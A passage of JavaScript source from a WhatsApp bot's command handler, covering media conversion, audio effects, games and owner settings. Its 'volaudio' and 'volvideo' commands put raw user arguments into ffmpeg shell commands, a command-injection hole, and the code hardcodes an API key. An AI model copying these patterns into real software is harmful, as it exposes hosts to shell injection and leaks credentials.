${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
  .map(
    (cpu, i) =>
      `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
        cpu.times
      )
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}`
  )
  .join("\n\n")}`
    : ""
}
                `.trim();
          XliconBotInc.relayMessage(
            m.chat,
            {
              requestPaymentMessage: {
                currencyCodeIso4217: "USD",
                amount1000: 999999999,
                requestFrom: m.sender,
                noteMessage: {
                  extendedTextMessage: {
                    text: finalStatus,
                    contextInfo: {
                      externalAdReply: {
                        showAdAttribution: true,
                      },
                    },
                  },
                },
              },
            },
            {}
          );
        }

        break;
      case "repo":
      case "repository":
        {
          try {
            const [, username, repoName] = botscript.match(
              /github\.com\/([^/]+)\/([^/]+)/
            );
            const response = await axios.get(
              `https://api.github.com/repos/salmanytofficial/XLICON-V3-MD`
            );
            if (response.status === 200) {
              const repoData = response.data;
              const formattedInfo = `
🔎 *_Repository Name:_* ${repoData.name}

📝 *_Description:_* ${repoData.description}

🔮 *_Owner:_* ${repoData.owner.login}

⭐ *_Stars:_* ${repoData.stargazers_count}

🎀 *_Forks:_* ${repoData.forks_count}

${themeemoji} URL: ${repoData.html_url}
     
     
 `.trim();
              await XliconBotInc.relayMessage(
                m.chat,
                {
                  requestPaymentMessage: {
                    currencyCodeIso4217: "USD",
                    amount1000: 69000,
                    requestFrom: m.sender,
                    noteMessage: {
                      extendedTextMessage: {
                        text: formattedInfo,
                        contextInfo: {
                          externalAdReply: {
                            showAdAttribution: true,
                          },
                        },
                      },
                    },
                  },
                },
                {}
              );
            } else {
              await replygcXlicon(`Unable to fetch repository information`);
            }
          } catch (error) {
            console.error(error);
            await replygcXlicon(`Repository currently not available `);
          }
        }
        break;
      case "buypremium":
      case "premiumuser":
        {
          let teks = `Hi ${pushname}👋\nWant to Buy Premium?Just chat with the owner😉`;
          await XliconBotInc.sendMessage(
            m.chat,
            {
              text: teks,
              contextInfo: {
                externalAdReply: {
                  showAdAttribution: true,
                  title: botname,
                  body: ownername,
                  thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                  sourceUrl: wagc,
                  mediaType: 1,
                  renderLargerThumbnail: true,
                },
              },
            },
            {
              quoted: m,
            }
          );
        }
        break;

      //rentbotadded here

      case "rentbot":
        {
          if (m.isGroup) return XeonStickPrivate();
          if (!XeonTheCreator) return XeonStickOwner();
          rentfromxeon(XeonBotInc, m, from);
        }
        break;
      case "rentbotlist":
        try {
          let user = [
            ...new Set([
              ...global.conns
                .filter((XeonBotInc) => XeonBotInc.user)
                .map((XeonBotInc) => XeonBotInc.user),
            ]),
          ];
          te = "*Rentbot List*\n\n";
          for (let i of user) {
            y = await XeonBotInc.decodeJid(i.id);
            te += " × User : @" + y.split("@")[0] + "\n";
            te += " × Name : " + i.name + "\n\n";
          }
          XeonBotInc.sendMessage(
            from,
            { text: te, mentions: [y] },
            { quoted: m }
          );
        } catch (err) {
          replygcxeon(`There are no users who have rented the bot yet`);
        }
        break;

      case "speedtest":
        {
          replygcXlicon("Testing Speed...");
          let cp = require("child_process");
          let { promisify } = require("util");
          let exec = promisify(cp.exec).bind(cp);
          let o;
          try {
            o = await exec("python speed.py");
          } catch (e) {
            o = e;
          } finally {
            let { stdout, stderr } = o;
            if (stdout.trim())
              XliconBotInc.sendMessage(
                m.chat,
                {
                  text: stdout,
                  contextInfo: {
                    externalAdReply: {
                      showAdAttribution: true,
                      title: botname,
                      body: ownername,
                      thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                      sourceUrl: wagc,
                      mediaType: 1,
                      renderLargerThumbnail: true,
                    },
                  },
                },
                {
                  quoted: m,
                }
              );
            if (stderr.trim())
              XliconBotInc.sendMessage(
                m.chat,
                {
                  text: stderr,
                  contextInfo: {
                    externalAdReply: {
                      showAdAttribution: true,
                      title: botname,
                      body: ownername,
                      thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                      sourceUrl: wagc,
                      mediaType: 1,
                      renderLargerThumbnail: true,
                    },
                  },
                },
                {
                  quoted: m,
                }
              );
          }
        }
        break;
      case "runtime":
        let pinga = `Bots Have Been Running For ${runtime(process.uptime())}`;
        XliconBotInc.sendMessage(
          m.chat,
          {
            text: pinga,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                sourceUrl: wagc,
                mediaType: 1,
                renderLargerThumbnail: true,
              },
            },
          },
          {
            quoted: m,
          }
        );
        break;
      case "sc":
      case "script":
      case "donate":
      case "donate":
      case "cekupdate":
      case "updatebot":
      case "cekbot":
      case "sourcecode":
        {
          let me = m.sender;
          let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${
            global.websitex
          }\nGitHub: ${global.botscript}\n\nHi @${
            me.split("@")[0]
          } 👋\nDont forget to donate yeah🍜 👇 https://www.buymeacoffee.com/ahmmikun`;
          sendXliconBotIncMessage(from, {
            text: teks,
            mentions: [sender],
            contextInfo: {
              forwardingScore: 9999999,
              isForwarded: true,
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "owner":
        {
          XliconBotInc.sendMessage(
            from,
            {
              contacts: {
                displayName: `${list.length} Contact`,
                contacts: list,
              },
            },
            {
              quoted: m,
            }
          );
        }
        break;
      //convert
      case "s":
      case "sticker":
      case "stiker":
        {
          if (!quoted)
            return replygcXlicon(
              `Send/Reply Images/Videos/Gifs With Captions ${
                prefix + command
              }\nVideo Duration 1-9 Seconds`
            );
          if (/image/.test(mime)) {
            let media = await quoted.download();
            let encmedia = await XliconBotInc.sendImageAsSticker(
              m.chat,
              media,
              m,
              { packname: global.packname, author: global.author }
            );
          } else if (/video/.test(mime)) {
            if ((quoted.msg || quoted).seconds > 11)
              return replygcXlicon(
                "Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds"
              );
            let media = await quoted.download();
            let encmedia = await XliconBotInc.sendVideoAsSticker(
              m.chat,
              media,
              m,
              { packname: global.packname, author: global.author }
            );
          } else {
            replygcXlicon(
              `Send/Reply Images/Videos/Gifs With Captions ${
                prefix + command
              }\nVideo Duration 1-9 Seconds`
            );
          }
        }
        break;
      case "swm":
      case "steal":
      case "stickerwm":
      case "take":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args.join(" ")) return replygcXlicon(`Where is the text?`);
          const swn = args.join(" ");
          const pcknm = swn.split("|")[0];
          const atnm = swn.split("|")[1];
          if (m.quoted.isAnimated === true) {
            XliconBotInc.downloadAndSaveMediaMessage(quoted, "gifee");
            XliconBotInc.sendMessage(
              from,
              { sticker: fs.readFileSync("gifee.webp") },
              { quoted: m }
            );
          } else if (/image/.test(mime)) {
            let media = await quoted.download();
            let encmedia = await XliconBotInc.sendImageAsSticker(
              m.chat,
              media,
              m,
              { packname: pcknm, author: atnm }
            );
          } else if (/video/.test(mime)) {
            if ((quoted.msg || quoted).seconds > 11)
              return replygcXlicon("Maximum 10 Seconds!");
            let media = await quoted.download();
            let encmedia = await XliconBotInc.sendVideoAsSticker(
              m.chat,
              media,
              m,
              { packname: pcknm, author: atnm }
            );
          } else {
            replygcXlicon(`Photo/Video?`);
          }
        }
        break;
      case "toimage":
      case "toimg":
        {
          if (!/webp/.test(mime))
            return replygcXlicon(
              `Reply sticker with caption *${prefix + command}*`
            );
          await XliconStickWait();
          let media = await XliconBotInc.downloadAndSaveMediaMessage(qmsg);
          let ran = await getRandom(".png");
          exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media);
            if (err) return err;
            let buffer = fs.readFileSync(ran);
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: buffer,
              },
              {
                quoted: m,
              }
            );
            fs.unlinkSync(ran);
          });
        }
        break;
      case "tomp4":
      case "tovideo":
        {
          if (!/webp/.test(mime))
            return replygcXlicon(
              `Reply sticker with caption *${prefix + command}*`
            );
          await XliconStickWait();
          let media = await XliconBotInc.downloadAndSaveMediaMessage(qmsg);
          let webpToMp4 = await webp2mp4File(media);
          await XliconBotInc.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
            },
            {
              quoted: m,
            }
          );
          await fs.unlinkSync(media);
        }
        break;
      case "toaud":
      case "toaudio":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            return replygcXlicon(
              `Send/Reply Video/Audio that you want to make into audio with captions ${
                prefix + command
              }`
            );
          await XliconStickWait();
          let media = await XliconBotInc.downloadMediaMessage(qmsg);
          let audio = await toAudio(media, "mp4");
          XliconBotInc.sendMessage(
            m.chat,
            {
              audio: audio,
              mimetype: "audio/mpeg",
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "tomp3":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            return replygcXlicon(
              `Send/Reply Video/Audio that you want to make into MP3 with captions ${
                prefix + command
              }`
            );
          await XliconStickWait();
          let media = await XliconBotInc.downloadMediaMessage(qmsg);
          let audio = await toAudio(media, "mp4");
          XliconBotInc.sendMessage(
            m.chat,
            {
              document: audio,
              mimetype: "audio/mp3",
              fileName: `SalmanSer.mp3`,
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "tovn":
      case "toptt":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            return replygcXlicon(
              `Send/Reply Video/Audio that you want to make into a VN with captions ${
                prefix + command
              }`
            );
          await XliconStickWait();
          let media = await XliconBotInc.downloadMediaMessage(qmsg);
          let { toPTT } = require("./lib/converter");
          let audio = await toPTT(media, "mp4");
          XliconBotInc.sendMessage(
            m.chat,
            {
              audio: audio,
              mimetype: "audio/mpeg",
              ptt: true,
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "togif":
        {
          if (!/webp/.test(mime))
            return replygcXlicon(
              `Reply sticker with caption *${prefix + command}*`
            );
          await XliconStickWait();
          let media = await XliconBotInc.downloadAndSaveMediaMessage(qmsg);
          let webpToMp4 = await webp2mp4File(media);
          await XliconBotInc.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
              gifPlayback: true,
            },
            {
              quoted: m,
            }
          );
          await fs.unlinkSync(media);
        }
        break;
      case "tourl":
        {
          await XliconStickWait();
          let media = await XliconBotInc.downloadAndSaveMediaMessage(qmsg);
          if (/image/.test(mime)) {
            let anu = await TelegraPh(media);
            replygcXlicon(util.format(anu));
          } else if (!/image/.test(mime)) {
            let anu = await UploadFileUgu(media);
            replygcXlicon(util.format(anu));
          }
          await fs.unlinkSync(media);
        }
        break;
      case "emojimix":
        {
          let [emoji1, emoji2] = text.split`+`;
          if (!emoji1)
            return replygcXlicon(`Example : ${prefix + command} 😅+🤔`);
          if (!emoji2)
            return replygcXlicon(`Example : ${prefix + command} 😅+🤔`);
          await XliconStickWait();
          let anu = await fetchJson(
            `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(
              emoji1
            )}_${encodeURIComponent(emoji2)}`
          );
          for (let res of anu.results) {
            let encmedia = await XliconBotInc.sendImageAsSticker(
              m.chat,
              res.url,
              m,
              {
                packname: global.packname,
                author: global.author,
                categories: res.tags,
              }
            );
          }
        }
        break;
      case "emojimix2":
        {
          if (!text) return replygcXlicon(`Example : ${prefix + command} 😅`);
          let anu = await fetchJson(
            `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(
              text
            )}`
          );
          for (let res of anu.results) {
            let encmedia = await XliconBotInc.sendImageAsSticker(
              m.chat,
              res.url,
              m,
              {
                packname: global.packname,
                author: global.author,
                categories: res.tags,
              }
            );
          }
        }
        break;
      case "toonce":
      case "toviewonce":
        {
          if (!quoted) return replygcXlicon(`Reply Image/Video`);
          if (/image/.test(mime)) {
            anuan = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: {
                  url: anuan,
                },
                caption: mess.done,
                fileLength: "999",
                viewOnce: true,
              },
              {
                quoted: m,
              }
            );
          } else if (/video/.test(mime)) {
            anuanuan = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: {
                  url: anuanuan,
                },
                caption: mess.done,
                fileLength: "99999999",
                viewOnce: true,
              },
              {
                quoted: m,
              }
            );
          } else if (/audio/.test(mime)) {
            bebasap = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
            XliconBotInc.sendMessage(m.chat, {
              audio: {
                url: bebasap,
              },
              mimetype: "audio/mpeg",
              ptt: true,
              viewOnce: true,
            });
          }
        }
        break;
      case "fliptext":
        {
          if (args.length < 1)
            return replygcXlicon(`Example:\n${prefix}fliptext SalmanSer`);
          quere = args.join(" ");
          flipe = quere.split("").reverse().join("");
          replygcXlicon(
            `\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`
          );
        }
        break;
      case "toqr":
        {
          if (!q) return replygcXlicon(" Please include link or text!");
          const QrCode = require("qrcode-reader");
          const qrcode = require("qrcode");
          let qyuer = await qrcode.toDataURL(q, { scale: 35 });
          let data = new Buffer.from(
            qyuer.replace("data:image/png;base64,", ""),
            "base64"
          );
          let buff = getRandom(".jpg");
          await fs.writeFileSync("./" + buff, data);
          let medi = fs.readFileSync("./" + buff);
          await XliconBotInc.sendMessage(
            from,
            { image: medi, caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�" },
            { quoted: m }
          );
          setTimeout(() => {
            fs.unlinkSync(buff);
          }, 10000);
        }
        break;
      case "volaudio":
        {
          if (!args.join(" "))
            return replygcXlicon(`Example: ${prefix + command} 10`);
          media = await XliconBotInc.downloadAndSaveMediaMessage(
            quoted,
            "volume"
          );
          rname = getRandom(".mp3");
          exec(
            `ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`,
            (err, stderr, stdout) => {
              fs.unlinkSync(media);
              if (err) return replygcXlicon("Error!");
              jadie = fs.readFileSync(rname);
              XliconBotInc.sendMessage(
                from,
                { audio: jadie, mimetype: "audio/mp4", ptt: true },
                { quoted: m }
              );
              fs.unlinkSync(rname);
            }
          );
        }
        break;
      case "volvideo":
        {
          if (!args.join(" "))
            return replygcXlicon(`Example: ${prefix + command} 10`);
          media = await XliconBotInc.downloadAndSaveMediaMessage(
            quoted,
            "volume"
          );
          rname = getRandom(".mp4");
          exec(
            `ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`,
            (err, stderr, stdout) => {
              fs.unlinkSync(media);
              if (err) return replygcXlicon("Error!");
              jadie = fs.readFileSync(rname);
              XliconBotInc.sendMessage(
                from,
                { video: jadie, mimetype: "video/mp4" },
                { quoted: m }
              );
              fs.unlinkSync(rname);
            }
          );
        }
        break;
      case "bass":
      case "blown":
      case "deep":
      case "earrape":
      case "fast":
      case "fat":
      case "nightcore":
      case "reverse":
      case "robot":
      case "slow":
      case "smooth":
      case "squirrel":
        try {
          let set;
          if (/bass/.test(command))
            set = "-af equalizer=f=54:width_type=o:width=2:g=20";
          if (/blown/.test(command)) set = "-af acrusher=.1:1:64:0:log";
          if (/deep/.test(command)) set = "-af atempo=4/4,asetrate=44500*2/3";
          if (/earrape/.test(command)) set = "-af volume=12";
          if (/fast/.test(command))
            set = '-filter:a "atempo=1.63,asetrate=44100"';
          if (/fat/.test(command))
            set = '-filter:a "atempo=1.6,asetrate=22100"';
          if (/nightcore/.test(command))
            set = "-filter:a atempo=1.06,asetrate=44100*1.25";
          if (/reverse/.test(command)) set = '-filter_complex "areverse"';
          if (/robot/.test(command))
            set =
              "-filter_complex \"afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75\"";
          if (/slow/.test(command))
            set = '-filter:a "atempo=0.7,asetrate=44100"';
          if (/smooth/.test(command))
            set =
              "-filter:v \"minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120'\"";
          if (/squirrel/.test(command))
            set = '-filter:a "atempo=0.5,asetrate=65100"';
          if (/audio/.test(mime)) {
            await XliconStickWait();
            let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
            let ran = getRandom(".mp3");
            exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
              fs.unlinkSync(media);
              if (err) return replygcXlicon(err);
              let buff = fs.readFileSync(ran);
              XliconBotInc.sendMessage(
                m.chat,
                { audio: buff, mimetype: "audio/mpeg" },
                { quoted: m }
              );
              fs.unlinkSync(ran);
            });
          } else
            replygcXlicon(
              `Reply to the audio you want to change with a caption *${
                prefix + command
              }*`
            );
        } catch (e) {
          replygcXlicon(e);
        }
        break;
      //media db
      case "listbadword":
        {
          let teks = "┌──⭓「 *VN List* 」\n│\n";
          for (let x of bad) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`;
          replygcXlicon(teks);
        }
        break;

      //game
      case "ttc":
      case "ttt":
      case "tictactoe":
        {
          let TicTacToe = require("./lib/tictactoe");
          this.game = this.game ? this.game : {};
          if (
            Object.values(this.game).find(
              (room) =>
                room.id.startsWith("tictactoe") &&
                [room.game.playerX, room.game.playerO].includes(m.sender)
            )
          )
            return replygcXlicon("You are still in the game");
          let room = Object.values(this.game).find(
            (room) =>
              room.state === "WAITING" && (text ? room.name === text : true)
          );
          if (room) {
            replygcXlicon("Partner not found!");
            room.o = m.chat;
            room.game.playerO = m.sender;
            room.state = "PLAYING";
            let arr = room.game.render().map((v) => {
              return {
                X: "❌",
                O: "⭕",
                1: "1️⃣",
                2: "2️⃣",
                3: "3️⃣",
                4: "4️⃣",
                5: "5️⃣",
                6: "6️⃣",
                7: "7️⃣",
                8: "8️⃣",
                9: "9️⃣",
              }[v];
            });
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join("")}
${arr.slice(3, 6).join("")}
${arr.slice(6).join("")}

Wait @${room.game.currentTurn.split("@")[0]}

Type *surrender* to give up and admit defeat`;
            if (room.x !== room.o)
              await XliconBotInc.sendText(room.x, str, m, {
                mentions: parseMention(str),
              });
            await XliconBotInc.sendText(room.o, str, m, {
              mentions: parseMention(str),
            });
          } else {
            room = {
              id: "tictactoe-" + +new Date(),
              x: m.chat,
              o: "",
              game: new TicTacToe(m.sender, "o"),
              state: "WAITING",
            };
            if (text) room.name = text;
            replygcXlicon(
              "Waiting for partner" +
                (text
                  ? ` type the command below ${prefix}${command} ${text}`
                  : "")
            );
            this.game[room.id] = room;
          }
        }
        break;
      case "delttc":
      case "delttt":
        {
          this.game = this.game ? this.game : {};
          try {
            if (this.game) {
              delete this.game;
              XliconBotInc.sendText(
                m.chat,
                `Berhasil delete session TicTacToe`,
                m
              );
            } else if (!this.game) {
              replygcXlicon(`Session TicTacToe🎮 tidak ada`);
            } else mewReply("?");
          } catch (e) {
            replygcXlicon("rusak");
          }
        }
        break;
      case "rockpaperscissors":
      case "rps":
        {
          this.suit = this.suit ? this.suit : {};
          let poin = 10;
          let poin_lose = 10;
          let timeout = 60000;
          if (
            Object.values(this.suit).find(
              (roof) =>
                roof.id.startsWith("suit") &&
                [roof.p, roof.p2].includes(m.sender)
            )
          )
            replygcXlicon(`Finish your previous RPS game.`);
          if (m.mentionedJid[0] === m.sender)
            return replygcXlicon(`Can't play with yourself. !`);
          if (!m.mentionedJid[0])
            return replygcXlicon(
              `_Who do you want to challenge?_\nTag the person aswell..\n\nExample : ${prefix}rps @${owner[1]}`,
              m.chat,
              {
                mentions: [owner[1] + "@s.whatsapp.net"],
              }
            );
          if (
            Object.values(this.suit).find(
              (roof) =>
                roof.id.startsWith("suit") &&
                [roof.p, roof.p2].includes(m.mentionedJid[0])
            )
          )
            return replygcXlicon(
              `The person you are challenging is playing rps with someone else :(`
            );
          let id = "suit_" + new Date() * 1;
          let caption = `_*ROCK PAPER SCISSORS*_

@${m.sender.split`@`[0]} challenged @${
            m.mentionedJid[0].split`@`[0]
          } to play rock paper scissors

@${m.mentionedJid[0].split`@`[0]} Please type *accept* or *reject*...`;
          this.suit[id] = {
            chat: await XliconBotInc.sendText(m.chat, caption, m, {
              mentions: parseMention(caption),
            }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: "wait",
            waktu: setTimeout(() => {
              if (this.suit[id])
                XliconBotInc.sendText(m.chat, `_Game time is up_`, m);
              delete this.suit[id];
            }, 60000),
            poin,
            poin_lose,
            timeout,
          };
        }
        break;
      case "mathquiz":
      case "math":
        {
          if (kuismath.hasOwnProperty(m.sender.split("@")[0]))
            replygcXlicon(`There are still unfinished sessions!`);
          let { genMath, modes } = require("./lib/math");
          if (!text)
            return replygcXlicon(
              `Mode: ${Object.keys(modes).join(
                " | "
              )}\nUsage example: ${prefix}math medium`
            );
          let result = await genMath(text.toLowerCase());
          XliconBotInc.sendText(
            m.chat,
            `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(
              result.waktu / 1000
            ).toFixed(2)} second`,
            m
          ).then(() => {
            kuismath[m.sender.split("@")[0]] = result.jawaban;
          });
          await sleep(result.waktu);
          if (kuismath.hasOwnProperty(m.sender.split("@")[0])) {
            console.log("Answer: " + result.jawaban);
            replygcXlicon(
              "Time has run out\nAnswer: " + kuismath[m.sender.split("@")[0]]
            );
            delete kuismath[m.sender.split("@")[0]];
          }
        }
        break;
      case "afk":
        {
          let user = global.db.data.users[m.sender];
          user.afkTime = +new Date();

          if (text) {
            user.afkReason = text;
            replygcXlicon(`*${m.pushName}* is now AFK for: \`${text}\``);
          } else {
            user.afkReason = "";
            replygcXlicon(`*${m.pushName}* is now AFK.`);
          }
        }
        break;
      case "ai":
      case "ask":
      case "openai":
        {
          if (db.data.users[sender].limit < 1) return replygcXlicon(mess.limit);
          if (!q)
            return replygcXlicon(
              `Example : ${prefix + command} who is ronaldo`
            );
          var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`);
          var isi = isiai.result;
          await replygcXlicon(isi);
        }
        break;
      case "xxqc":
        {
          if (!q)
            return replygcXlicon(
              `📌Example: ${
                prefix + command
              } pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`
            );
          if (text.length > 100) return replygcXlicon(`Max 100 character.`);
          let [color, ...message] = text.split(" ");
          message = message.join(" ");
          let backgroundColor;
          switch (color) {
            case "pink":
              backgroundColor = "#f68ac9";
              break;
            case "blue":
              backgroundColor = "#6cace4";
              break;
            case "red":
              backgroundColor = "#f44336";
              break;
            case "green":
              backgroundColor = "#4caf50";
              break;
            case "yellow":
              backgroundColor = "#ffeb3b";
              break;
            case "purple":
              backgroundColor = "#9c27b0";
              break;
            case "darkblue":
              backgroundColor = "#0d47a1";
              break;
            case "lightblue":
              backgroundColor = "#03a9f4";
              break;
            case "ash":
              backgroundColor = "#9e9e9e";
              break;
            case "orange":
              backgroundColor = "#ff9800";
              break;
            case "black":
              backgroundColor = "#000000";
              break;
            case "white":
              backgroundColor = "#ffffff";
              break;
            case "teal":
              backgroundColor = "#008080";
              break;
            case "lightpink":
              backgroundColor = "#FFC0CB";
              break;
            case "chocolate":
              backgroundColor = "#A52A2A";
            case "salmon":
              backgroundColor = "#FFA07A";
              break;
            case "magenta":
              backgroundColor = "#FF00FF";
              break;
            case "tan":
              backgroundColor = "#D2B48C";
              break;
            case "wheat":
              backgroundColor = "#F5DEB3";
              break;
            case "deeppink":
              backgroundColor = "#FF1493";
              break;
            case "fire":
              backgroundColor = "#B22222";
              break;
            case "skyblue":
              backgroundColor = "#00BFFF";
              break;
            case "orange":
              backgroundColor = "#FF7F50";
              break;
            case "brightskyblue":
              backgroundColor = "#1E90FF";
              break;
            case "hotpink":
              backgroundColor = "#FF69B4";
              break;
            case "lightskyblue":
              backgroundColor = "#87CEEB";
              break;
            case "seagreen":
              backgroundColor = "#20B2AA";
              break;
            case "darkred":
              backgroundColor = "#8B0000";
              break;
            case "orangered":
              backgroundColor = "#FF4500";
              break;
            case "cyan":
              backgroundColor = "#48D1CC";
              break;
            case "violet":
              backgroundColor = "#BA55D3";
              break;
            case "mossgreen":
              backgroundColor = "#00FF7F";
              break;
            case "darkgreen":
              backgroundColor = "#008000";
              break;
            case "navyblue":
              backgroundColor = "#191970";
              break;
            case "darkorange":
              backgroundColor = "#FF8C00";
              break;
            case "darkpurple":
              backgroundColor = "#9400D3";
              break;
            case "fuchsia":
              backgroundColor = "#FF00FF";
              break;
            case "darkmagenta":
              backgroundColor = "#8B008B";
              break;
            case "darkgray":
              backgroundColor = "#2F4F4F";
              break;
            case "peachpuff":
              backgroundColor = "#FFDAB9";
              break;
            case "darkishgreen":
              backgroundColor = "#BDB76B";
              break;
            case "darkishred":
              backgroundColor = "#DC143C";
              break;
            case "goldenrod":
              backgroundColor = "#DAA520";
              break;
            case "darkishgray":
              backgroundColor = "#696969";
              break;
            case "darkishpurple":
              backgroundColor = "#483D8B";
              break;
            case "gold":
              backgroundColor = "#FFD700";
              break;
            case "silver":
              backgroundColor = "#C0C0C0";
              break;
            default:
              return replygcXlicon("The selected color is not available.");
          }
          let obj = {
            type: "quote",
            format: "png",
            backgroundColor,
            width: 512,
            height: 768,
            scale: 2,
            messages: [
              {
                entities: [],
                avatar: true,
                from: {
                  id: 1,
                  name: pushname,
                  photo: {
                    url: await XliconBotInc.profilePictureUrl(
                      m.sender,
                      "image"
                    ).catch(
                      () =>
                        "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
                    ),
                  },
                },
                text: message,
                replyMessage: {},
              },
            ],
          };
          let response = await axios.post(
            "https://bot.lyo.su/quote/generate",
            obj,
            {
              headers: {
                "Content-Type": "application/json",
              },
            }
          );
          let buffer = Buffer.from(response.data.result.image, "base64");
          XliconBotInc.sendImageAsSticker(m.chat, buffer, m, {
            packname: `${global.packname}`,
            author: `${global.author}`,
          });
        }
        break;
      case "ephemeral":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins) return XliconStickAdmin();
          if (!text) return replygcXlicon("Enter the value enable/disable");
          if (args[0] === "on") {
            await XliconBotInc.sendMessage(m.chat, {
              disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL,
            });
            await replygcXlicon(`*_Done_*`);
          } else if (args[0] === "off") {
            await XliconBotInc.sendMessage(m.chat, {
              disappearingMessagesInChat: false,
            });
            await replygcXlicon(`*_Done_*`);
          }
        }
        break;
      case "delete":
      case "del":
      case "d":
        {
          let key = {};
          try {
            key.remoteJid = m.quoted
              ? m.quoted.fakeObj.key.remoteJid
              : m.key.remoteJid;
            key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe;
            key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id;
            key.participant = m.quoted
              ? m.quoted.fakeObj.participant
              : m.key.participant;
          } catch (e) {
            console.error(e);
          }
          XliconBotInc.sendMessage(m.chat, { delete: key });
        }
        break;
      case "autoswview":
      case "autostatusview":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            antiswview = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            antiswview = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "anticall":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            anticall = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            anticall = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
        break;
      case "addvideo":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (args.length < 1) return replygcXlicon("Whats the video name?");
          if (VideoXeon.includes(q))
            return replygcXlicon("The name is already in use");
          let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          VideoXeon.push(q);
          await fsx.copy(delb, `./XliconMedia/video/${q}.mp4`);
          fs.writeFileSync(
